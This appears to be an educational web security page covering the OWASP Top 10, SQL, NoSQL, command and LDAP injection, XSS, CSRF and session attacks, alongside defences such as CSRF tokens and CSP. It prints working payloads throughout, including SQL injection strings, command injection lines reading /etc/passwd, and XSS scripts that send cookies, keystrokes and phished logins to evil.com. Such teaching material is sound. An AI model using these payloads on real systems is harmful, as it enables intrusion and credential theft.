Same-Origin Policy & Cross-Origin Concepts

Fundamental security concepts that govern how web applications interact:

Same-Origin Policy

Restricts how documents/scripts from one origin can interact with resources from another origin. Origins must match:

  • Protocol: http:// vs https://
  • Domain: example.com vs subdomain.example.com
  • Port: :80 vs :8080
// Same Origin Examples: // ✅ https://example.com/page1 → https://example.com/page2 // ❌ https://example.com → http://example.com (different protocol) // ❌ https://example.com → https://api.example.com (different subdomain)

OWASP Top 10 Web Application Security Risks

OWASP Top 10 2021 (Current Standard)

The Open Web Application Security Project (OWASP) maintains the definitive list of web application security risks:

1. A01 - Broken Access Control

Risk: Unauthorized access to restricted functionality

Example: Accessing admin panels, viewing other users' data

Impact: Data breach, privilege escalation

2. A02 - Cryptographic Failures

Risk: Weak encryption, exposed sensitive data

Example: Plain text passwords, weak SSL/TLS

Impact: Data exposure, man-in-the-middle attacks

3. A03 - Injection

Risk: Malicious code execution through input

Example: SQL injection, command injection

Impact: Database compromise, system takeover

4. A04 - Insecure Design

Risk: Flawed security architecture

Example: Missing security controls by design

Impact: Fundamental security weaknesses

5. A05 - Security Misconfiguration

Risk: Improperly configured security settings

Example: Default passwords, verbose errors

Impact: Unauthorized access, information disclosure

6. A06 - Vulnerable Components

Risk: Using components with known vulnerabilities

Example: Outdated libraries, unpatched frameworks

Impact: System compromise, remote code execution

7. A07 - Authentication Failures

Risk: Broken authentication mechanisms

Example: Weak passwords, session hijacking

Impact: Account takeover, identity theft

8. A08 - Software Integrity Failures

Risk: Unverified code and updates

Example: Unsigned plugins, supply chain attacks

Impact: Malicious code execution

9. A09 - Logging & Monitoring Failures

Risk: Insufficient logging and incident response

Example: No audit logs, delayed breach detection

Impact: Extended breach duration, compliance violations

10. A10 - Server-Side Request Forgery

Risk: Tricking server into making malicious requests

Example: Internal network scanning, cloud metadata access

Impact: Internal system compromise

OWASP Top 10 Evolution

Key changes from 2017 to 2021:

  • New #1: Broken Access Control (previously #5)
  • Combined: Cryptographic Failures (sensitive data exposure + crypto failures)
  • New Entry: Insecure Design (A04)
  • New Entry: Software and Data Integrity Failures (A08)
  • Renamed: SSRF moves from XXE category to standalone (A10)

SQL injection remains one of the most dangerous and common web application vulnerabilities:

SQL Injection Types

Classic SQLi
Direct SQL query manipulation
Blind SQLi
No visible error messages

Using delays to confirm injection
Union-based
Combining queries with UNION

Vulnerable Code Example

// Vulnerable PHP code $query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'"; // Attack payload: admin'-- // Results in: SELECT * FROM users WHERE username = 'admin'-- ' AND password = '' // The -- comments out the password check!

SQL Injection Attack Vectors

  • Authentication Bypass: ' OR '1'='1
  • Data Extraction: UNION SELECT password FROM admin_users
  • Database Enumeration: ' UNION SELECT version(),database(),user()--
  • File System Access: ' UNION SELECT LOAD_FILE('/etc/passwd')--
  • Command Execution: '; EXEC xp_cmdshell('dir')--

NoSQL Injection

Modern NoSQL databases introduce new injection vectors:

// MongoDB injection example // Vulnerable Node.js code db.users.find({ username: req.body.username, password: req.body.password }); // Attack payload in JSON: // {"username": {"$ne": ""}, "password": {"$ne": ""}} // This bypasses authentication by using "not equal" operators

Command Injection

Executing system commands through vulnerable input processing:

Linux Command Injection

# Vulnerable code: ping command ping $user_input # Attack payloads: ; cat /etc/passwd && whoami | ls -la / `id` $(uname -a)

Windows Command Injection

# Vulnerable code: dir command dir %user_input% # Attack payloads: & type c:\windows\system32\drivers\etc\hosts && net user | dir c:\

LDAP Injection

Manipulating LDAP queries for directory service attacks:

// Vulnerable LDAP query "(&(uid=" + username + ")(password=" + password + "))" // Attack payload: admin)(|(uid=* // Results in: (&(uid=admin)(|(uid=*)(password=password)) // This creates an OR condition that always evaluates to true

Cross-Site Scripting (XSS) Attacks

XSS Attack Types & Mechanisms

Cross-Site Scripting allows attackers to inject malicious scripts into web applications that are then executed by victim browsers.

Reflected XSS (Non-Persistent)

  • Payload reflected immediately in response
  • Requires social engineering (malicious link)
  • Not stored on server
  • Single-request attack
<script>alert('XSS')</script> <img src=x onerror=alert('XSS')> javascript:alert('XSS')

Stored XSS (Persistent)

  • Payload stored in database/server
  • Executes for every user viewing content
  • More dangerous than reflected
  • Common in comments, forums, profiles
<script> document.location='http://evil.com/steal.php?cookie='+document.cookie </script>

DOM-Based XSS

  • Payload executes via DOM manipulation
  • Never sent to server
  • Client-side only vulnerability
  • Difficult to detect with traditional scanners
// Vulnerable JavaScript document.write(location.hash.substring(1)); // Attack URL: http://site.com/page#<script>alert('XSS')</script>

XSS Attack Payloads & Techniques

Common XSS Payloads

<script>alert('XSS')</script> <script>new Image().src='http://evil.com/steal.php?c='+document.cookie;</script> <script> document.addEventListener('keydown', function(e) { new Image().src='http://evil.com/log.php?key=' + e.key; }); </script> <script>fetch('http://evil.com/hijack', {method:'POST', body:document.cookie});</script> <script> document.body.innerHTML = '<div>Login expired. <form action="http://evil.com/phish"><input name="user"><input name="pass" type="password"><input type="submit"></form></div>'; </script>

Filter Evasion Techniques

  • Case Variation: <ScRiPt>alert('XSS')</ScRiPt>
  • HTML Encoding: &lt;script&gt;alert('XSS')&lt;/script&gt;
  • URL Encoding: %3Cscript%3Ealert('XSS')%3C/script%3E
  • Unicode: \\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e
  • Event Handlers: <img src=x onerror=alert('XSS')>
  • JavaScript URI: javascript:alert('XSS')

Cross-Site Request Forgery (CSRF) Attacks

Understanding CSRF: The Invisible Attack

Cross-Site Request Forgery tricks authenticated users into performing unintended actions on web applications where they're logged in.

How CSRF Works

  1. Victim authenticates to legitimate website (bank.com)
  2. Attacker creates malicious page with forged request
  3. Victim visits attacker's page while still logged into bank.com
  4. Browser automatically sends authenticated cookies with forged request
  5. Server processes request as if it came from the legitimate user

CSRF Attack Example: Bank Transfer

<!-- Legitimate bank transfer form --> <form action="https://bank.com/transfer" method="POST"> <input name="to_account" value="12345"> <input name="amount" value="1000"> <input type="submit" value="Transfer"> </form> <!-- Attacker's malicious page --> <img src="https://bank.com/transfer?to_account=999999&amount=10000" style="display:none"> <!-- Or auto-submitting form --> <form id="csrf" action="https://bank.com/transfer" method="POST"> <input name="to_account" value="999999"> <input name="amount" value="10000"> </form> <script>document.getElementById('csrf').submit();</script>

CSRF Attack Vectors & Techniques

Image-Based CSRF

<img src="https://admin.com/delete_user?id=123"> <img src="https://shop.com/buy?item=laptop&qty=5">

Exploits GET requests that change application state

Form-Based CSRF

<form action="https://app.com/change_email" method="POST"> <input name="email" value="attacker@evil.com"> </form> <script> document.forms[0].submit(); </script>

Targets POST requests with automatic form submission

AJAX CSRF

<script> var xhr = new XMLHttpRequest(); xhr.open("POST", "https://api.com/delete_account", true); xhr.setRequestHeader("Content-Type", "application/json"); xhr.send('{"confirm": true}'); </script>

Advanced technique targeting AJAX endpoints

CSRF Protection Mechanisms

Primary Defense: CSRF Tokens

<!-- Synchronizer Token Pattern --> <form action="/transfer" method="POST"> <input type="hidden" name="csrf_token" value="abc123xyz789"> <input name="to_account" value="12345"> <input name="amount" value="1000"> </form> // Server-side validation if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) { die('CSRF token mismatch!'); }

Additional CSRF Defenses

  • SameSite Cookies: Prevents cross-site cookie sending
  • Origin/Referer Validation: Check request source
  • Custom Headers: Require non-simple headers for AJAX
  • Double Submit Cookie: Compare cookie and form values
  • Re-authentication: Require password for sensitive actions
  • CAPTCHA: Human verification for critical operations

CSRF vs XSS: Understanding the Difference

Cross-Site Scripting (XSS)

  • Injects malicious scripts
  • Executes in victim's browser
  • Targets users of the application
  • Can bypass CSRF protections

Cross-Site Request Forgery (CSRF)

  • Forges malicious requests
  • Executes on target server
  • Targets the application itself
  • Requires user to be authenticated

Authentication & Session Management Attacks

Authentication Vulnerabilities

Authentication failures represent one of the most critical security risks in web applications.

Weak Password Policies

  • No minimum length requirements
  • Common passwords allowed
  • No complexity requirements
  • Password reuse permitted

Brute Force Attacks

  • No rate limiting implementation
  • Account lockout bypasses
  • Dictionary attacks
  • Credential stuffing

Session Management Issues

  • Predictable session IDs
  • Session fixation attacks
  • Insufficient session timeout
  • Session hijacking vulnerabilities

Session Hijacking Techniques

Session Cookie Theft

// XSS payload to steal session cookies <script> document.location='http://evil.com/steal.php?cookie='+document.cookie; </script> // Or using fetch API <script> fetch('http://evil.com/log.php', { method: 'POST', body: 'cookies=' + encodeURIComponent(document.cookie) }); </script>

Session Attack Vectors

  • Session Fixation: Forcing user to use attacker-known session ID
  • Session Prediction: Guessing sequential session identifiers
  • Man-in-the-Middle: Intercepting session tokens over insecure connections
  • Session Replay: Reusing captured session tokens
  • Cross-Site Session Transfer: Session token leakage via referrer headers

Authentication Bypass Techniques

// SQL Injection Authentication Bypass Username: admin'-- Password: anything // Results in SQL: // SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'anything' // Logic flaw exploitation // Vulnerable code: if (username == "admin" || password == "secret123") { grant_access(); } // Attack: Use any username with password "secret123"

Multi-Factor Authentication (MFA) Bypasses

  • Response Manipulation: Modifying MFA verification responses
  • Session Abuse: Bypassing MFA after initial authentication
  • Backup Code Enumeration: Brute forcing backup codes
  • Time-based Attack: Exploiting TOTP synchronization issues
  • Social Engineering: SIM swapping and phone number hijacking

Secure Authentication Implementation

Authentication Best Practices

  • Strong Password Policy: Minimum 12 characters, complexity requirements
  • Account Lockout: Progressive delays and temporary lockouts
  • Secure Session Management: Cryptographically random session IDs
  • HTTPS Everywhere: Encrypt all authentication traffic
  • Multi-Factor Authentication: Something you know + something you have
  • Session Security: HttpOnly, Secure, and SameSite cookie flags

Input Validation & Sanitization

Defense in Depth Strategy

// Input validation example (PHP) function validateInput($input, $type) { switch($type) { case 'email': return filter_var($input, FILTER_VALIDATE_EMAIL); case 'int': return filter_var($input, FILTER_VALIDATE_INT); case 'string': return htmlspecialchars($input, ENT_QUOTES, 'UTF-8'); default: return false; } } // Prepared statements for SQL injection prevention $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? Common Validation Mistakes

  • Client-side Only: Relying solely on JavaScript validation
  • Blacklist Approach: Blocking known bad inputs instead of allowing good
  • Incomplete Encoding: Not encoding for the correct context
  • Length Limits: Not enforcing maximum input lengths
  • Type Confusion: Not validating data types properly

Content Security Policy (CSP)

CSP provides an additional layer of security against XSS attacks by controlling resource loading:

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https://fonts.googleapis.com; connect-src 'self' https://api.example.com; frame-ancestors 'none'; Content-Security-Policy: default-src 'none'; script-src 'nonce-abc123def456'; style-src 'nonce-xyz789uvw012'; img-src 'self'; base-uri 'self'; form-action 'self';

CSP Implementation Strategy

  • Report-Only Mode: Test CSP without blocking resources
  • Gradual Deployment: Start with permissive policies and tighten
  • Nonce-based: Use random nonces for inline scripts/styles
  • Hash-based: Allow specific inline code using SHA hashes
  • Monitoring: Analyze CSP violation reports regularly

WAF Limitations

While WAFs provide valuable protection, they should not be the sole security measure:

  • Bypass Techniques: Encoding, obfuscation, and payload variants
  • False Positives: Blocking legitimate traffic
  • Performance Impact: Latency and throughput considerations
  • Configuration Complexity: Requiring ongoing tuning and maintenance
